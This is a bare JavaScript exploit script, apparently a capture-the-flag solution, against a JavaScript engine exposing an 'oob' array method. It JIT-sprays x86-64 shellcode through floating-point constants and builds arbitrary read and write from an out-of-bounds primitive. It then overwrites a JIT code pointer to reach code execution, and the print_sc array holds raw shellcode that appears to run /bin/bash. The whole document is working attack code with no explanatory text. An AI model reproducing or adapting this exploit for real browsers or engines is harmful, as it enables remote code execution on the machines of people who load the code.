let cv_ab = new ArrayBuffer(8);
let f64_ta = new Float64Array(cv_ab);
let u64_ta = new BigUint64Array(cv_ab);
let wasmCode = new Uint8Array([0,97,115,109,1,0,0,0,1,133,128,128,128,0,1,96,0,1,127,3,130,128,128,128,0,1,0,4,132,128,128,128,0,1,112,0,0,5,131,128,128,128,0,1,0,1,6,129,128,128,128,0,0,7,145,128,128,128,0,2,6,109,101,109,111,114,121,2,0,4,109,97,105,110,0,0,10,138,128,128,128,0,1,132,128,128,128,0,0,65,42,11]);
let wasmModule = new WebAssembly.Module(wasmCode);
let wasmInstance = new WebAssembly.Instance(wasmModule);
let func = wasmInstance.exports.main;

Number.prototype.toBigInt = function() {
    f64_ta[0] = this;
    return u64_ta[0];
}

BigInt.prototype.toDouble = function() {
    u64_ta[0] = this;
    return f64_ta[0];
}

BigInt.prototype.hex = function() {
    return "0x" + this.toString(16).padStart(16, 0);
}

Number.prototype.hex = function() {
    return this.toBigInt().hex();
}

if (typeof dumpObject === 'undefined') {
    var dumpObject = console.log
}

function sc() {
    const find_me = 5.40900888e-315;      // 0x41414141 in memory - Used as a way to find
    // const A = -9.255963134931783e+61;
    const A = -6.828527034422786e-229;
    // const B = -9.255963134931783e+61;
    const C = 7.340387646374746e+223
    const D1 = -5.6323145813786076e+190
    const E1 = 7.748604185565308e-304
    const F1 = 7.591064455398236e+175
    const a = 1.773290436458278e-288
    const b = 7.748604204935092e-304
    const d = 2.1152000545026834e+156
    const e = 2.7173154612872197e-71
    const f = 1.2811179539027648e+145
    const g = 4.0947747766066967e+40
    const h = 1.7766685363804036e-302
    const i = 3.6509617888350745e+206
    const v = -6.828523606646638e-229

    // const C = 1.4813365150669252e+248;
    D = -6.032447120847604e-264;
    E = -6.0391189260385385e-264;
    F = 1.0842822352493598e-25;
    G = 9.241363425014362e+44;
    H = 2.2104256869204514e+40;
    I = 2.4929675059396527e+40;
    J = 3.2459699498717e-310;
    K = 1.637926e-318;
}
sc.ab = new ArrayBuffer(0x1000);
dv = new DataView(sc.ab);
dv.setBigUint64(0, 0x1212121212121212n);
for(i=0;i<0x1000;i++) sc();


victim_obj = sc;
leak_offset = 8;
arb_offset = 13;

// dumpObject(victim_obj)
x = new Array(1.1, 1.2, 1.3, 1.4);
victim_ta = new Uint8Array(8);
victim_ta.what = victim_obj;
victim_ta.fill(0x43);
// dumpObject(x)
// dumpObject(victim_ta)
// readline()

leak = x.oob(leak_offset)
console.log('[+] leak = ' + leak.hex());
x.oob(arb_offset, leak)
read_ta = new BigUint64Array(victim_ta.buffer);
wasm_addr = read_ta[0] & 0xffff_ffffffffn;
console.log("[+] wasm_addr = " + wasm_addr.hex())

function arb_read(addr) {
    x.oob(arb_offset, addr.toDouble())
    x.oob(arb_offset - 3, (0xfffa000000000000n).toDouble())
    read_ta = new BigUint64Array(victim_ta.buffer);
    return read_ta[0];
}

function arb_write(addr, val) {
    x.oob(arb_offset, addr.toDouble())
    // x.oob(arb_offset - 3, (0xfffa000000000000n).toDouble())
    // dumpObject(victim_ta);
    // readline();
    // read_ta = new BigUint64Array(victim_ta.buffer);
    // dv = new DataView(victim_ta.buffer)
    // dv.setBigUint64(0, BigInt(val))
    for (var i = 0; i < 8; i++) {
        victim_ta[i] = Number((val >> BigInt(i * 8) & 0xffn))
    }
    // dumpObject(victim_ta.buffer);
    // read_ta[0] = BigInt(val);
}



rce_offset = wasm_addr + 0x28n;
jit_addr = arb_read(rce_offset);
code_addr = arb_read(jit_addr);
console.log('[+] jit_addr = ' + jit_addr.hex())
console.log('[+] code_addr = ' + code_addr.hex())

pivot = 0x4141414142424242n;
sc_start = -1
for (var i = 0; i < 1000; i++) {
    sc_start = code_addr + BigInt(8 * i);
    check = arb_read(sc_start)
    // console.log(check.hex());
    if (check == 0x41414141n) {
        console.log("found shellcode");
        break;
    }
}

sc_start += 0x10n;
console.log('[+] sc_start = ' + sc_start.hex())
// arb_write(jit_addr, pivot);

function print_sc() {
    let scar = [
        // 0xcccccccc_ccccccccn
        0x6e69622fb848686an,
0xe78948507361622fn,
0x10101010101b848n,
0x64732eb848500101n,
0x431480173646560n,
0x101010101b84824n,
0x6063b84850010101n,
0x314801622c016972n,
0x5e106a56f6312404n,
0x485e156a56e60148n,
0x1485e186a56e601n,
0x6ad231e6894856e6n,
0x90909090050f583bn,
    ]

    for (var i = 0; i < scar.length; i++) {
        console.log(scar[i].toDouble());
    }
}


// print_sc();
arb_write(jit_addr, sc_start);
sc();
// func(); // RCE!
EOF